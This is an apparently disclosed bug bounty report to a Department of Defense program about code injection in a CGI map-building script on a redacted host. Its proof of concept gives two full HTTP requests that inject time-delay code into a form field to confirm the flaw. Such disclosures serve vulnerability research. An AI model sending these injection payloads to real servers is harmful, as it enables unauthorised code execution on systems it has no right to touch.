# Сode injection host  █████████

## Report Details
- **Report ID**: 954398
- **URL**: https://hackerone.com/reports/954398
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-08-09T14:54:50.075Z
- **Disclosed**: 2020-09-03T17:27:02.127Z

## Reporter
- **Username**: e3xpl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Good day,  security team. Host █████████ vulnerable to code injection.
POC
The server makes a time delay.

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ███
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

mapArea=colP&cumTime=${{"sleep"%2c"13"})}${{"timeout"%2c"13"})}

or

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ██████████
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Connection: close

mapArea=colP&cumTime=${sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}

## Impact

Potential execution of arbitrary code.
https://owasp.org/www-community/attacks/Code_Injection

## Attachments
No attachments
